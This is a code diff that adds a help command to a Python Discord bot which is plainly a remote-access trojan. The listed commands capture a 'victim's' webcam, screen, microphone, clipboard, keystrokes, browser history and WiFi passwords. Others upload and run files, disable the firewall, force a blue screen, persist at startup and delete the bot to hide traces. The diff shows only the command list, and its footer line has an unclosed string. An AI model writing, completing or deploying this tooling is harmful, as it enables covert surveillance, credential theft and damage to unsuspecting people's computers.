@@ -844,6 +844,45 @@ async def bye(ctx):
     os.remove(file_path)
     await bot.close()
 
+@bot.command()
+async def cmds(ctx):
+    embed = discord.Embed(title="Command List", description="Here are all available commands:", color=0xFF0000)  # Red color
+    embed.add_field(name="!webcam", value="Take an image of the webcam and send it", inline=False)
+    embed.add_field(name="!screenshot", value="Takes a screenshot of the victim's monitor and sends it", inline=False)
+    embed.add_field(name="!clipboard", value="Takes the content of the victim's clipboard and sends it", inline=False)
+    embed.add_field(name="!browser", value="Takes browser history of Chrome and Edge", inline=False)
+    embed.add_field(name="!delete (file path)", value="Deletes file in that certain path", inline=False)
+    embed.add_field(name="!download (file path)", value="Sends file to Discord", inline=False)
+    embed.add_field(name="!tts message", value="Plays a message on the victim's screen", inline=False)
+    embed.add_field(name="!ip", value="Grabs the victim's PUBLIC IP and geolocates it", inline=False)
+    embed.add_field(name="!hwid", value="Takes the victim's HWID", inline=False)
+    embed.add_field(name="!jumpscare", value="Shows the image scarylarry.png on their screen", inline=False)
+    embed.add_field(name="!mic", value="Logs past 30 seconds of the victim's mic and sends a wav file", inline=False)
+    embed.add_field(name="!wifi", value="Takes WiFi Passwords", inline=False)
+    embed.add_field(name="!upload(file)", value="Uploads and executes a file on the victim's PC", inline=False)
+    embed.add_field(name="!fakeerror", value="Shows a fake error (no limit, can be spammed)", inline=False)
+    embed.add_field(name="!start", value="Starts keylogger", inline=False)
+    embed.add_field(name="!stop", value="Stops keylogger", inline=False)
+    embed.add_field(name="!specs", value="Get PC specs", inline=False)
+    embed.add_field(name="!name", value="Get monitor and PC username", inline=False)
+    embed.add_field(name="!discord", value="Gets Discord username (useless imo)", inline=False)
+    embed.add_field(name="!screen_record", value="Records screen for 30 seconds", inline=False)
+    embed.add_field(name="!network_adapter", value="Disables WiFi (admin required)", inline=False)
+    embed.add_field(name="!disable_firewall", value="Disables firewall (admin required)", inline=False)
+    embed.add_field(name="!shutdown", value="Shuts down PC", inline=False)
+    embed.add_field(name="!screenoff", value="Turns off the victim's screen for 30 seconds", inline=False)
+    embed.add_field(name="!startup", value="Actually adds to startup", inline=False)
+    embed.add_field(name="!goon", value="Opens The Hub multiple times", inline=False)
+    embed.add_field(name="!processes", value="Lists all processes", inline=False)
+    embed.add_field(name="!kill (pid)", value="Kills processes", inline=False)
+    embed.add_field(name="!bsod", value="Executes blue screen of death", inline=False)
+    embed.add_field(name="!bye", value="Deletes file off PC to hide traces", inline=False)
+    embed.add_field(name="!rstartup", value="Removes from startup", inline=False)
+    
+    embed.set_footer(text="CMDS INSPIRED BY ORANGEWARE)
+    
+    await ctx.send(embed=embed)
+
 
 
 
